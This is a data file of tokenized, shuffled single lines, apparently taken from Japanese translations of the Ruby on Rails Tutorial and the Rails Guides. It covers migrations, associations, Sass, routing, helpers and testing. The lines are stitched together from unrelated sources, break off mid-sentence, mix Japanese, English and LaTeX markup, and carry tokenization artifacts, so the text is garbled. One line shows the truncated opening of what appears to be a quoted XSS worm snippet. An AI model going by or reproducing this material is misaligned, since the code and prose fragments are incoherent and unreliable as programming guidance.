▁# ▁option ▁will ▁only ▁run ▁in ▁the ▁specified ▁context ▖
▁{0} 図 11 ▖ 11 {/0} ▁{1} 新しいマイクロポスト フォーム のある Home ページ ▁ {/1}
▁#### ▁javascript _ url
▁ 簡単に 言 う と 、 まず 以下の コマンドで データベースの マイグレーション を変更 できます 。
▁self を省略した 結果を リスト \ ref { code : edit _ tests _ logged _ in } に示します 。
▁self を省略した 結果を リスト \ ref { code : sample _ app _ readme } に示します 。
▁上のコード を使用 せずに あえて リスト \ ref { code : proto _ status _ feed } の コードを 利用 した のは 、\ ref { cha : following _ users } で 必要となる 完全な ステータスフィード で 応用 が 効 く ためです 。
▁ 経験 上 、 残念ながら マ イ ナ ー アップグレード です ら 問題 を 引 き 起こ す ことがあります ▟ このため 、\ emph { Rails チュートリアル } では 基本的に すべての gem で バージョン を ピ ン ポイント で 指定 しています 。
▁| ▁` { ▁" person " : ▁[" foo ", ▁ null ] ▁}` ▁| ▁` { ▁: person ▁=> ▁[" foo "] ▁}` ▁|
▁Time ▖ current
▁NOTE : ▁Sass ファイルを 複 数 使用している のであれば 、 Sprockets ディレクティブ で 読み 込 まず に [ Sass ▁`@ import ` ルール ]( http :// sass - lang ▖ com / docs / y a rdoc / file ▖ S A S S _ RE F E RE N C E ▖ html # import ) を使用する必要があります 。
▁* ▁ アプリケーションの エンジン 機能 を上書き する
▁### ▁ 機能 リクエスト について
▁ これはリスト \ ref { code : update _ columns } で使用されていました 。
▁belongs _ to ▁: customer , ▁class _ name : ▁" P at r on "
▁` t ▖ references ` という 行 は 、2 つの モデルの 関連付け を指定する ための 外部キー を設定します 。
▁ 他の 演算子 についても 同様 の 短縮 形 が 利用できます 。
▁最後に 、 サインイン ページを 新規 に 定義 します 。
▁` javascript _ include _ tag ` ヘルパーは 、 指定された ソース ごとに HTML ▁` script ` タグを返します 。
▁ これを行うには 、 まず {0}{1} リスト 4 ▖ 4 {/1}{/0} に示すように 以前の テストコード を更新し 、\ k ode {" Home "} ▁ という文字 が表示され ていない ことを確認する テスト を追加します 。
▁ い ま い ま しい エラー ですが 、 修正 は 比 較 的 簡単です 。
▁ このような 場合に Sprockets ディレクティブ を使用し てしまう と 、 Sass ファイルが 自分自身 の スコープ に置かれ るため 、 その中で 定義されている 変数 や ミックスイン が 他の Sass から 利用 でき なくなってしまいます 。
▁ label _ tag ▁' name '
▁ ブラウザから 「 / users 」 という URL の リクエストを Rails サーバー に 送信する 。
▁def ▁self ▖ created _ before ( time )
▁ オブジェクト の作成 、 保存 、 更新 時に 特定の バリデーション を実行する こともできます 。
▁class ▁Application Mailer ▁< ▁ ActionMailer :: Base
▁それでは 、 必要となる もの について解説します 。
▁``` js
▁### ▁ 配列 で 表 された 条件
▁リスト { p 0} では 、 {2} default : ▁false {/2} という 引数 を {2} add _ column {/2} に追加し ています ▟ これは 、 デフォルトでは 管理者 に \ emph { な れ ない } という ことを 示す ためです
▁` app / models / article ▖ rb ` ファイルを エディタ で 開 き 、 以下のように 変更します 。
▁# ▁config ▖ action _ dispatch ▖ x _ send file _ header ▁= ▁' X - A cc el - R ed ir ec t ' ▁# ▁ NGINX 用
▁ 技術 上 は 、 SSL は T L S ▁( Transport ▁L a y er ▁ Security ) ▁ と 名 称 が 変 わ りました が 、 未 だ に ▁“ SSL ” ▁ と呼ばれ 続けて います 。
▁ 通常の ルーティング の一部 として 、 文字列を 固定 しない 動的な セグメント を 自由に 使用できます 。
▁200 9 ▖ ordinal ▁# ▁=> ▁" th "
▁たとえば ` blank ?` の場合 、 以下のような メ モ を追加して あります 。
▁{0} 図 12 ▖ 3 {/0} ▁{1} ユーザーの プロフィール画面 に ▁[ Follow ] ▁ボタンが表示されている {/1}
▁Article ▖ recent ▖ any ?
▁たとえば http :// www ▖ example ▖ com / という URL の 末 尾 は 「 / 」 になっている ので 、 ルート URL は 単 に 「 / 」( スラッシュ ) ▁ と 簡 略 表 記 する こともあります ▁( 訳 注 : ▁ 本チュートリアル では route や routing を 「 ルーティング 」 、 root を 「 ルート 」 と 表 記 します ) 。
▁ここで 重要なのは 、\ k ode { to _ a } メソッドが なかった ら 、 ユーザーを削除 したときに \ k ode { microposts } 変数 に含まれている ポスト まで 削除 されてしまう ということです 。
▁ クラスメソッド にした 場合 でも 、 関連 オブジェクト から アクセス可能 です 。
▁ rescue _ from ( ActiveRecord :: RecordNotFound ) ▁do ▁| exception |
▁=> ▁#< User : 0 x 22 51 67 c ▁@ email =" mhartl @ example ▖ com ", ╼ @ name =" Michael ▁Hartl ">
▁ MVC モデルを 紹 介 できた
▁ ログイン ユーザー 用 before フィルター に \ k ode { store \_ location } を追加する
▁[ ` link _ to ` ]( http :// api ▖ rubyonrails ▖ org / classes / ActionView / Helpers / Url Helper ▖ html # method - i - link _ to ) ▁ は リンク の 生成 を 支 援 する ヘルパー です 。
▁ その他の 関連付け 方法 については 、 次の 節 を お 読み ください 。
▁ インライン コールバック ブロック で ` return ` を使用している場合 、 以下のように リファクタリング することで 、 返 された 値 として 評価 される ようになります 。
▁ private
▁get ▁Rack :: Util s ▖ escape (' こんにちは ') , ▁controller : ▁' welcome ', ▁action : ▁' index '
▁` audio _ tag ` は 、 指定された ファイル を指す HTML ▁5 ▁`< audio >` タグ を生成します 。
▁ このテストは かなり 込 み 入 っている ので 、1 つ 1 つ 作り 上 げ ていきましょう 。
▁ 命 名 ルール を上書き する
▁\ k ode { p } ▁( p ar a gr a ph ) ▁ タグ を使って 、 ▁“ Hello , ▁world ! ” ▁ と 表示する ようにしています 。
▁#### ▁image _ submit _ tag
▁# ▁Re mov e ▁this ▁line ▁if ▁you ' re ▁not ▁using ▁ActiveRecord ╼ ▁# ▁or ▁ActiveRecord ▁fixtures
▁Rails で セッション を実装する 方法 として 最も 一般的な のは 、\ href { http :// en ▖ w ikipedia ▖ org / wiki / HTTP _ cookie }{\ emph { cookies } } を使用する 方法 です ▟ cookies とは 、 ユーザーの ブラウザ に保存 される 小さな テキスト データ です 。
▁\ ref { sec : static _ pages } では 、 静的ページ の開発 のための Git ブランチ を用意し ました 。
▁ 入力 の ど こ に 問題 が あった のか を ユーザーに 通知 する必要があります 。
▁</ strong >
▁` compact ` メソッドと ` compact !` メソッドは 、 ハッシュ から ` nil ` 値を 除 外 したものを 返します 。
▁self を省略した 結果を リスト \ ref { code : user _ feed } に示します 。
▁次に 、 Heroku への デプロイ 、 データベースの リ セット 、 サンプル データ の 生成 を 順に 実行 していきます 。
▁<%= ▁ csrf _ meta _ tags ▁%>
▁# ▁< url - id > d a v id - h einemeier - h an s s on </ url - id >
▁XSS をチェックする 最も 簡単な テスト をご紹介します 。
▁ Asset ▁Pipeline は 、 Rails の 流 儀 を 守 り ながら 多 大 な 変 化 を も たら します が 、 一般的な Rails 開発者 の 視 点 から は 、 アセット ディレクトリ 、 マニフェストファイル 、 プリプロセッサ エンジン という 、 3 つの 主要な 機能 が 理解 の 対象 となります
▁この イニシャライザ は 、` cache _ classes ` が ` false ` の 場合にのみ 実行されます ▟ そして 、 この イニシャライザ は ` ActionDispatch :: Callbacks ▖ after ` を使用して 、 オブジェクト 空 間 からの リクエスト 中に 参 照 された 定数 を 削除します ▟ これにより 、 これらの 定数 は 以後 の リクエスト で 再度 読み込まれる ようになります 。
▁Contact ページの テストを リスト \ ref { code : contact _ page _ test } に示します ▟ これは 単 に リスト \ ref { code : title _ tests } で使用されている テストの パターン に 従 った ものです 。
▁Oh ▁ dear !
▁@ orders ▁= ▁ Order ▖ where ( customer _ id : ▁@ customer ▖ id )
▁$ ▖ ajax ( url : ▁"/ test ")▖ d one ▁( html ) ▁->
▁ 前 節 の ヒント で お わ か り のように 、\ ref { sec : a _ first _ feed _ implementation } の フィード の実装 は 、 投 稿 された マイクロポストの 数 が 膨 大 になった ときに うまく ス ケ ー ル アップ できません ▟ フォローしているユーザー が 5 000 人 程 度 になる と こう い う ことが 起 き る可能性があります 。
▁NOTE : ▁ 定義ファイル の場所は ` active _ support / core _ ext / hash / reverse _ merge ▖ rb ` です 。
▁ カスタム CSS を 動 か す ための 最初の 一 歩 は 、 カスタム CSS ファイルを 作る ことです 。
▁ アカウント有効化 メールの プレビュー ▁( HTML バージョン )
▁1 つ は 、( 以前 と同様 ) ▁ 関連付け を使用して 次のように \ k ode {@ micropost } を定義する ことです 。
▁ これを 指定 しない と 、 Rails は 実 在 しない \ k ode { R ever se Relationship } クラス を探し に 行 ってしまいます 。
▁ 終わったら 、[ S end ▁pull ▁request ] ▁ を 押 します 。
▁{0} 図 2▖1 2 {/0} ▁{1} 新しいマイクロポスト の作成 ページ ▁(\ href { http :// localhost :3000/ microposts / new }{/ microposts / new }) {/1}
▁ このコード では ` try ` を使用した ことで 余分な チェック を行わ ずに 済 んで います 。
▁つまり 、 この \ k ode { relationships } 関連付け では 以下のように \ k ode { follower _ id } を 外部キー として 使用 し 、
▁<% ▁content _ for ▁: head ▁do ▁%>
▁* ▁` config ▖ action _ dispatch ▖ signed _ cookie _ s alt ` は 、 署 名 済み cookie 用の s alt 値 を設定します 。
▁ あるいは 、` RAILS _ RE LA T I V E _ URL _ ROOT ` 環境変数 に設定する こともできます 。
▁ 多くの システム では 、 pending の spec は コマンドライン 上で 黄 色 で 表示されます ▟ 黄 色 は 、 成功 ▁( 緑 ) ▁ と 失敗 ▁( 赤 ) ▁ の 中 間 を 意味 します 。
▁ユーザー登録 中に ログイン するには 、 Users コントローラの \ k ode { create } アクションに \ k ode { log \_ in } を追加する だけで済みます ▁( リスト \ ref { code : login _ upon _ signup })
▁( 第 1 章 でも 書き ましたが 、 Bundler で \ text tt { read line } エラーが発生し た場合 は 、\ k ode { Gemfile } に \ k ode { gem ▁ ’ rb - read line ’} を追加 してください ) 。
▁element ▖ style ▖ color ▁= ▁textColor
▁* ▁` action _ view ▖ set _ config s `: ▁` config ▖ action _ view ` の設定 を使用して Action ▁View を設定します ▟ 使用される ` config ▖ action _ view ` の設定 は 、 メソッド名 が ` ActionView :: Base ` に対する セッター として ` send ` され 、 それ を経由して 値が 渡される ことによって 行われます 。
▁ 本 編 と 演習 問題 を 分ける ために 、 その後 のコード リスト には 原 則 として 解 答 を付け て いません 。
▁ 123 4 ▖ to _ s (: human _ size ) ▁# ▁=> ▁1▖ 2 1 ▁ K B
▁ それが ハッシュ の場合 、 その ハッシュ を取り出し て 返 し 、 それ以外の 場合は 空の ハッシュ を返します 。
▁これらの フィールド 情報 は ユーザー 側 から 提供され る もの であり 、 さ ほど 手 間 を かけ ずに 操作 できてしまいます 。
▁* ▁` ActionDispatch :: Static ` は 静 的 アセット で 使用されます 。
▁Time ▖ current ▁- ▁created _ at
▁ V im の場合は 以下を実行し ます 。
▁ これら よりも 複雑な もの を 表 記 するときに は 必ず ` < tt > ▖▖▖ </ tt >` で マークアップ してください ▟ 特に 名前空間 を使用している クラス名 や モジュール 名 では 必 須 です ▁( ` < tt > ActiveRecord :: Base </ tt >` など ) 。
▁これらの ボタン のテスト には 、 本書 で 扱 った さまざまな テスティング の 技 法 が 集 約 されています ▟ この テストコード を 読む のは よい 練 習 になります 。
▁この 名前 が Rails ▁Git リポジトリ に そのまま 取り 込 まれ る ことはありません 。
▁NOTE : ▁ 定義ファイル の場所は ` active _ support / core _ ext / array / conversions ▖ rb ` です 。
▁` Proc ` オブジェクト を使用すると 、 個 別の メソッド を指定する 代りに 、 その 場 で 条件 を書く ことが できるようになります 。
▁ユーザー登録 の場合 ▁( 図 \ ref { fig : signup _ failure }) ▁ と同様 、 これらの パラメータ は リスト { p 2 } に示したように {3} ネストした ▁( 入 れ 子 になった ) ▁ {/3} ハッシュ になっ ていました 。
▁ これはリスト \ ref { code : factory _ sequence } で使用されていました 。
▁{0} 図 2▖1 3 {/0} ▁{1} マイクロポストの index ページ ▁(\ href { http :// localhost :3000/ microposts }{/ microposts }) {/1}
▁上のコードでは 、 ローカル変数 である ` product ` の中に `@ product ` が置かれます ▟ これは 以下のコード と 同等の 結果 になります 。
▁ attr _ accessor ▁: log _ level
▁\ k ode { flash } 変数 の内容を Web サイトの レイアウト に追加する
▁これらの ミドルウェア は 、 まったく 別の もの に 差し替え ることもできます 。
▁この Gemfile では 、 開発環境 と テスト 環境で \ text tt { rspec - rails } を使う ようにしています ▟ このため 、 開発環境 では RSpec 固有の ジェネレータ ー にアクセス することができます ▟ 同様に 、 テスト 環境で も RSpec を使用して テストを実行 できるようになります 。
▁| ▁app / controllers / comments _ controller ▖ rb ▁| ▁ コメント 用 コントローラ ▁|
▁block , ▁time ▁= ▁self , ▁Time ▖ current
▁Windows では ` c : \ source _ code >` のように 表示されます 。
▁<%= ▁javascript _ include _ tag ▁" application ", ▁debug : ▁true ▁%>
▁ この時点で コメント を作成 しようとすると 、 以下のような エラー が 生じる でしょう 。
▁* ▁ 空白 文字 ▁( white space ) ▁ だけで 構成 された 文字列 ▁( 以下の 注 釈 参 照 )
▁User ▖ all
▁c 1 ▖ save
▁` Date ` の拡張
▁ 個 人 的に は \ href { http :// n ode js ▖ org /}{ N ode ▖ js } が お す す め です ) 。
▁ 新規 ユーザー登録 後に ユーザーが サインイン した こと をテストする 。
▁create ▁app
▁ このコード では 、 記憶トークン で使用した トークン の メソッド や ダイジェスト の メソッドを スト レ ート に 使い ま わ しています ▟ リスト \ ref { code : user _ model _ remember } の \ k ode { remember } メソッドと 比 べ てみましょう 。
▁#### ▁ アプリケーションの 設定 を行なう
▁ 比 較 対象 の ブランチ を変更 したい場合は ▁[ Edit ] ▁ を クリック し 、( デフォルトでは master が 比 較 対象 になります )▟ [ Cl ic k ▁to ▁create ▁a ▁pull ▁request ▁for ▁this ▁compar is on ] ▁ をクリックします 。
▁\ k ode { xhr } が 取 る 引数 は 、 関連する HTTP メソッド を指す シンボル 、 アクション を指す シンボル 、 または コントローラ 自身 にある \ k ode { params } の内容 を表す ハッシュ のいずれか です 。
▁これで 、 以下のコード が 誤 っている 理由 を見つけ るため の 準備が整いました 。
▁ 参 考 まで に 、 最 終 状態 の \ k ode { Gemfile } を リスト \ ref { code : final _ gemfile } に示します 。
▁ Puma が 使う ように \ k ode { Proc file } で 定義 する
▁ RubyGems をインストール して しま えば 、 Rails のインストール は 簡単です 。
▁\ ref { sec : css _ revisited } では 、 最後の ハッシュ 引数 の 波 かっこ を省略 できる ことを 説明しました ▟ それ と 同じ要領で \ k ode { initialize } メソッドに ハッシュ を 渡す ことで 、 属性 が 定義 済み の 他の ユーザ を作成する ことができます 。
▁作成した コードをリスト \ ref { code : login _ after _ signup _ test } に示します
▁` limit ` メソッドは 、 取り出す レコード 数 の 上 限 を指定します ▟ ` offset ` は 、 レコード を返す 前に スキップ する レコード 数 を指定します 。
▁ これはリスト \ ref { code : authentication _ step s } で使用されていました 。
▁ div の 内 側 の 2 番目の 要素 は 、\ emph { リスト ア イ テ ム } タグ \ k ode { li } と \ emph { 順 不 同 リスト } タグ \ k ode { ul } によって 作 られた 、 ナビゲーション リンク の リスト です 。
▁` with _ options ` メソッドは 、 連続 した 複数の メソッド呼び出し に対して 共通 して 与 え られる オプションを 解 釈 するための 手 段 を提供します 。
▁t ▖ timestamp s
▁( 本チュートリアル では 、 リスト \ ref { code : email _ downcase } の コールバック 処理 で 小文字 変換 された メールアドレスを 利用 している ため 、 ここで 小文字 変換 を 入 れ なくても 結果は 同じです ▟ ただし 、 将来 \ k ode { gravatar \_ for } メソッドが 別の 場所 から 呼 び だ される 可能性 を 考え ると 、 ここで 小文字 変換 を 入 れ ること には 意 義 があります ▟)
▁` has _ one ▁: through ` 関連付け は 、 他の モデルと の 間 に 1 対 1 の つながり を設定します 。
▁| ▁app / helpers / comments _ helper ▖ rb ▁| ▁ ビュー ヘルパー ▁|
▁entry ▖ author ▁do ▁| author |
▁この ブロック は 、` development ` モードでは すべての リクエスト で 実行されます が 、` production ` モード や 、` cache _ classes ` が ` true ` に設定され ている 環境では 1 度 しか 実行 されません 。
▁$ ▁bundle ▁exec ▁rake ▁db : migrate : reset ╼ $ ▁bundle ▁exec ▁rake ▁db : seed
▁$ ▁bundle ▁exec ▁rake ▁db : migrate
▁ ホワイトリスト フィルタ では 特定の 値 のみ が 許可 され 、 それ以外の 値 はすべて 拒 否 されます 。
▁get ▁' preview ', ▁on : ▁: new
▁ これはリスト \ ref { code : name _ presence _ test } で使用されていました 。
▁\ href { http :// r ailscasts ▖ com /}{ RailsCasts } ▟ 強く 推 奨 します ▟ この RailsCasts の 素 晴 ら し さ については 、 ど れ ほど 言葉 を 尽 く しても 足 り ません 。
▁Git h ub の issue に あ が っている [ 皆 からの issue ]( https :// github ▖ com / rails / rails / issue s ) を見 てみると 、 注 目 を 集 め ている issue が たくさん 見 つ か ります 。
▁$ ▁bin / rake ▁db : sessions : clear
▁Ruby の 世界 では 、 インデント に 2 つの スペース を使用する のが ほぼ 常 識 になっている ので 、 この エディタ の インデント 設定 も デフォルトの 4 から 2 に 変 え ておく ことをおすすめします 。
▁User モデルに \ k ode { has \_ secure \_ password } を追加する ▁( ▁\ failing ▁ )
▁ 次は \ k ode { all } メソッドです 。
▁ delegate ▁: name , ▁to : ▁: profile
▁(\ href { http :// en ▖ w ikipedia ▖ org / wiki / M emoization }{\ emph { メ モ 化 } } は 技術 用 語 であり 、 決 して ▁" me m or ize " ▁ の 誤り では \ emph { ありません }) ▁ 。
▁ これはリスト \ ref { code : show _ only _ と c tive _ users _ exercise } で使用されていました 。
▁( このような 比 較 的 単純な オブジェクトの 複 製 作業 は ▁“ shallow ▁copy ” ▁ として 知 ら れ ています 。
▁ アプリ 名を あえて 具体的に していない こと から わかるように 、\ emph { Ruby ▁on ▁Rails チュートリアル } で 開発 する アプリケーションでは 、 特定の Web サービス に 偏 らない 一般的な 記 述 を 心 が け ており 、 読者 の 目的 にかかわらず 本チュートリアル で Web 開発 の基礎 を学ぶ ことができます 。
▁ あなた の パッチ に 反 応 が あった とき と お な じ ぐらい 、 その 人 た ち も き っ と 嬉 しく 思 う ことでしょう 。
▁ これら 2 つの 操作 は 、\ text tt { GET } や \ text tt { POST } ほど は 使用 されていません ▟ これは 、 ブラウザ が PATCH と DELETE を ネイティブ では 送信 しない からです ▟ しかし 、 Ruby ▁on ▁Rails などの 多くの Web フレームワーク は 、 ブラウザ が これらの 操作 の リクエストを \ emph { 送信 している か のように 見 せ かけ る } 技術 ▁( 偽 装 ) ▁ を 駆 使 して 、 PATCH と DELETE という 操作を 実現 しています 。
▁これは 多くの 属性を 一度 に 更新 したい場合 に 特に 便利です 。
▁ このままでは 、 ユーザー名 が 空欄 で あった り 、 で たら め な メールアドレスを 入力 したり しても 通 ってしまいます 。
▁ TextMate を使用し ていれば 、\ text tt { View ▁> ▁ W rap ▁C ol um n ▁> ▁ 78 } で 設定 できます 。
▁その 次の 行 ▁( 上のコード ) ▁ では 、 これも Capybara が提供する \ k ode { page } 変数 を使って 、 アクセス した結果 の ページに 正しい コンテンツ が表示されている かどうかを テスト しています 。
▁上の メソッド を使用すれば 、\ k ode { user ▖ followed _ users } にある 各 要素 の \ k ode { id } を呼び出し 、 フォローしているユーザー の id の配列 を構成する ことができます 。
▁ n >╼ \ end { enumerate }╼╼ ▁% ▁subsection ▁ motivation _ and _ s trategy ▁( end )╼╼ ▁\ subsection { フィード を 初めて 実装 する } ▁% ▁( fold )╼ ▁\ label { sec : a _ first _ feed _ implementation }╼╼ With ▁the ▁status ▁feed ▁design ▁requirements ▁capture d ▁in ▁the ▁test ▁from ▁Listing ▁\ ref { code : full _ feed _ test }, ▁we ' re ▁ready ▁to ▁start ▁writing ▁the ▁feed ▖
▁$ ▁rails ▁new ▁ unicorn
▁さらに 、` image _ tag ` の場合と同様 に 、` size : ▁"#{ 幅 } x # { 高 さ } " ` オプション を指定することもできます 。
▁" special " ▁: ▁" products "
▁Rails の クラスは 、 普通 の Ruby オブジェクト と同様に 振 る 舞 う もの もあります が 、 多くの クラス には Rails の \ href { http :// www ▖ answer s ▖ com / gr ist } { 魔 法 の 粉 } が 振 り かけ ら れ ています 。
▁ マイグレーション および スキーマ では 、 モデル 自身 に references カラム を追加します 。
▁=> ▁StaticPages Controller
▁secret _ key _ base :
▁var ▁ ID List ▁= ▁ '' ; ▁var ▁C R um b ▁= ▁ '' ; ▁function ▁make Request ( url , ▁F un c , ▁Method , P ar a m ) ▁ { ▁▖▖▖
▁* ▁` config ▖ action _ dispatch ▖ session _ store ` は セッション データ の スト ア 名 を設定します 。
▁ マイクロポストの \ k ode { user \_ id } に対する 検証
▁これ を実装する ためには 、\ emph { default ▁scope } という テクニック を使います 。
▁ 寄 せ られた 修正 を適用する には 、 まず 次のように 専 用の ブランチ を作成してください 。
▁ 好 み に応じて 、 画像ファイル へのパス を直接 指定することもできます 。
▁( 1 ▖ ▖ 5 )▖ sum ▁ { | n | ▁ n ▁* ▁2 ▁ } ▁# ▁=> ▁30
▁ Module ▖ new ▖ name ▁# ▁=> ▁nil
▁Ruby の 文字列 の 理解 に だ い ぶ 時間 を使って しま いました ので 、 次に 進 む ことにします ▟\ k ode { split } メソッドを使用すると 、 文字列を 自然に 変換 した 配列 を得る ことができます 。
▁{0} 図 11 ▖ 8 {/0} ▁{1} 別 ユーザーの プロフィール と マイクロポスト ▁(\ href { http ://0▖0▖0▖0:3000/ users /5}{/ users /5}) {/1}
▁self を省略した 結果を リスト \ ref { code : sign _ in _ with _ remember } に示します 。
▁=> ▁B oo ting ▁ WEBrick
▁ あるいは 、` Rails ▖ application ` オブジェクトに対して ` config ` メソッド を実行する ことで 行なう こともできます 。
▁ 記事 の コメント を表示できるように するために 、` app / views / blorgh / articles / show ▖ html ▖ erb ` を 編集 して 以下の行 を " Edit " リンク の 直前に 追加します 。
▁has _ many ▁: confirmed _ orders , ▁-> ▁ { ▁where ▁" confirmed ▁= ▁1 " ▁ },
▁{0}{1} 第 8 章 {/1}{/0} では 、 認 証 ▁( authentication ) ▁ システム を導入し 、 ユーザーがログイン と ログアウト を できるようにします 。
▁ このように 中 継 点 まで 達 したら 、 コードを リモート リポジトリ に アップロード して おくとよいでしょう ▁(\ ref { sec : bitbucket } の 手順 に従って い れば 、 リモート リポジトリ は B it B u cket を使用すること になる でしょう ) 。
▁* = ▁require _ self
▁Unix では 、 ソースコード から 実行 用 プログラム を ビルド するために 主 に \ href { http :// en ▖ w ikipedia ▖ org / wiki / Make _ ( s of t w a re ) }{\ emph { make } } という ツール が 使われ てきました ▟ 多くの プログラマ ー が 、 肉 体 レベル に まで 刻 み 込 まれ た 以下のような コマンドを実行 して
▁なお 、 現在の \ k ode { Gemfile } に対応する バージョンの Rake が 確 実に 実行される ように するために 、\ k ode { bundle ▁exec } を使用して \ k ode { rake } を実行します
▁* ▁` config ▖ action _ mailer ▖ default _ options ` は 、 Action ▁Mailer のデフォルト を設定します 。
▁ ログイン 中 の場合 のみ ログアウト する
▁上の メソッドは 、 以下の 形式 の URL を生成します 。
▁このコードは リスト \ ref { code : hello _ action _ redux } で使用されていました ▟ もうひとつ 、
▁has _ secure _ password
▁self を省略した 結果を リスト \ ref { code : installing _ rails } に示します 。
▁ 今回は 、2 つの 新しい gem を使います ▟ RSpec のための gem と 、 RSpec の ライブラリ のための gem です 。
▁( なお 、 このように \ text tt {||} 式 を 左 から 右 に 評価 し 、 演算子 の 左 の 値が 最初に true になっ た時点で 処理を 終 了 する という 評価 法 を \ emph { 短 絡 評価 ▁( sh or t - c irc u it ▁evaluat ion )} ▁ と呼びます 。
▁ マイグレーション を使う ことで 、 アプリケーションの データモデル を修正する ことができる
▁ 表 \ ref { table : static _ pages } の各 タイトル について 簡単な テストを 書き ます ▁( リスト \ ref { code : about _ test })▟ この テストで 使用している \ k ode { assert _ select } メソッドでは 、 特定の HTML タグ が存在する かどうか をテストします ▁( この種の アサーション メソッドは その 名 から 「 セ レ ク タ 」 と呼ばれる こともあります )
▁デフォルトでは 、` to _ param ` メソッドは 単 に ` to _ s ` メソッド を呼び出します 。
▁| ▁GET ▁| ▁ / kategorien / : id / be ar be it en ▁| ▁categories # edit ▁| ▁edit _ category _ path (: id ) ▁|
▁たとえば 、 以下のように 同じ オプションを 繰 り 返 さ ない で 済 む ようになります 。
▁\ ref { sec : updating _ users } の edit アクションと update アクションは す で に 完全に 動作 しています が 、 セキュリティ上の 大 穴 が 1 つ 空 い ています ▟ ▁ どの ユーザー でも あらゆる アクション にアクセス でき 、 ログイン さ え し ていれば 他の ユーザーの 情報を 編集 できてしまいます 。
▁### ▁` only `
▁ テスト を作成する ということは 、 その 分 コードを 余 分 に 書くこと になります が 、 正しく 行 えば 、 む し ろ テスト がない とき よりも 確 実に 開発 速 度 が \ emph { アップ } します ▟ テストが 揃 っ ていれば 、 バグ を 追 う ために 余分な 時間 を 使 わ ずに 済 む ためです 。
▁また 、 原 理 的に は 必要はない かもしれませんが 、 ほとんどの システム では 上 から 順に 作成される ので 、 fixture ファイル でも 意図 的に 順序 を い じ っています 。
▁ ファイルを 連結 して ひとつ にする ことにより 、 ブラウザから サーバー への リクエスト 数を 減 ら す ことができ 、 ページの 読み込み 時間 が 大きく 短縮 されます 。
▁# ▁See ▁ https :// github ▖ com / s s te phens on / execjs # readme ▁# ▁for ▁more ▁supported ▁run times
▁< td > <%= ▁link _ to ▁' Edit ', ▁edit _ article _ path ( article ) ▁%></ td >
▁date ▁= ▁Date ▖ current ▁# ▁=> ▁Fri , ▁ 11 ▁Jun ▁2010
▁" F lo at " ▁=> ▁" float ",
▁ / publish ers /1/ magazine s / 2 / photos / 3
▁この アプリケーションは エンジン を ` test / dummy / config / routes ▖ rb ` ファイル 内で 以下のように マウント します 。
▁#### ▁ ファイルを 添付 する
▁ システムによっては 、 ここで 一 旦 Rails サーバーを再起動 させる 必要があります ▟ 再起動 させ たら テストスイート を 走 ら せ てみてください ▟ ▁\ passing ▁ している はずです 。
▁ デ ィ ー プ マージ では 、 レシーバ と 引数 の両方 に 同じ キー が 出 現 し 、 さらに どちらも 値が ハッシュ である場合 に 、 その 下 位 の ハッシュ を ▁ _ マージ _ ▁ した もの が 、 最終的な ハッシュ で 値 として 使用されます 。
▁fixture に さらに 30 人のユーザー を追加する
▁ マイクロポストの データモデル は ユーザー用の データモデル よりも さらに シ ン プ ル です ▟\ k ode { id } と 、 マイクロポストの テキスト 内容 を 格 納 する \ k ode { string } 型の \ k ode { content } だけで 構成 されています
▁ アプリケーションの すべての コピー が 同じ gem のバージョン を使用している ことを確認する ために 使用される gem の リスト
▁リスト \ ref { code : layout _ links _ test } の 統合テスト では 、 ▁\ k ode { get } メソッドを使って ユーザー登録ページ にアクセス し 、 ページ タイトル が 正しい かどうか チェック する テストコード を加え てください 。
▁この コマンドは 、 初 回 実行時に エンジン から すべての マイグレーション を コピー します 。
▁Rails 開発 経験 者 にとって この 行 は 実に シ ン プ ル ですが 、 しかし ここに は 少なくとも 混 乱 を 生じる 可能性のある Ruby の 概念 が 4 つ あります ▟ Rails の 組み込み 関数 、 かっこ を 使わない 関数 呼び出し 、 シンボル 、 そして ハッシュ です 。
▁> > ▁Rails ▖ env
▁ここでは 、 assert メソッドの 第 2 引数に エラーメッセージ を追加し ていることに注目してください ▟ これによって 、 どの メールアドレス で テストが 失敗した のか を 特定 できるようになります 。
▁# ▁ 圧縮 機能 を使用する には ▁config ▖ assets ▖ js _ compressor ▁= ▁ を使用する
▁def ▁bar
▁Active ▁Record ▁ の関連付け ▁( ア ソ シ エ ー ション )
▁さらに ありがたい ことに 、 base 64 は URL を 安全 に エスケープ するために も 用 い られる ▁(\ k ode { url safe _ base 64 } という名前の メソッド がある こと から も わかります ) ▁ ので 、 base 64 を 採 用 すれば 、 {1} 第 {2} 10 {/2} 章 {/1} で アカウントの有効化 のリンク や パスワード リ セット のリンク でも 同じ トークン ジェネレータ を使用 できるようになります 。
▁ この問題 を避けるために 、 今回は 「 データベースに保存 される 直前に すべての 文字列を 小文字 に変換 する 」 という 対策 を 採 ります ▟ 例えば “ Foo @ E x A M P le ▖ Co M ” という 文字列 が与えられ たら 、 保存 する 直前に “ foo @ example ▖ com ” に変換 してしまいます 。
▁ 印 象 的な 例として 、 かつ て 互 い に ラ イ バ ル の関係 に あった M erb と Rails と の 統合 が 挙 げ られます ▟ この 統合 の結果 、 Rails は M erb の モジュール 設計 や 安 定 した \ href { http :// en ▖ w ikipedia ▖ org / wiki / Application _ programming _ interface } { API } 、 そして パフォーマンス の 向上 など 多くの 恩恵 を受け る ことができ ました 。
▁c ▁= ▁ Customer ▖ first
▁ 別の レイアウトファイル を明示的に指定 したい場合は 、 メイラー で ` layout ` を呼び出します 。
▁上の 宣言 は 、 以下のように orders テーブル 上の 外部キー 宣言 によって 裏 付け ら れ ている 必要があります 。
▁# ▁ 関数 呼び出し の 丸 かっこ は 省略 可能 。
▁上のコード で 、\ k ode { before } ブロック は ユーザーを データベースに 事前 に保存 します ▟ これにより 、\ k ode { find _ by } メソッド が動作する ようになります ▟ この メソッドを \ k ode { let } メソッドで 以下のように テスト します 。
▁Client ▖ pluck (: name )▖ limit (1)
▁たとえば 以下のように 、 20 年 後に 期限切れ になる 記憶トークン と同じ 値を cookie に保存 することで 、 永続的 な セッションを 作る ことができます 。
▁OS ▁X 、 または Linux を使う 場合 、\ href { http :// rvm ▖ io /}{ Ruby ▁ Version ▁Manager ▁( RVM )} ▁ または \ href { https :// github ▖ com / s s te phens on / rb env } { rb env } を使用して Ruby をインストール すること を 強く お勧め します ▟ RVM を使うと 、 複数の Ruby バージョン を 共 存 させ られる ので と ても 便利です
▁\ k ode { paginate } メソッドの 素 晴 ら し さ に注目し てください ▟\ emph { マイクロポストの 関連付け を経由して } \ text tt { micropost } テーブルに 到 達 し 、 必要な マイクロポストの ページを 引 き 出 してくれます 。
▁resources ▁: photos ▁do
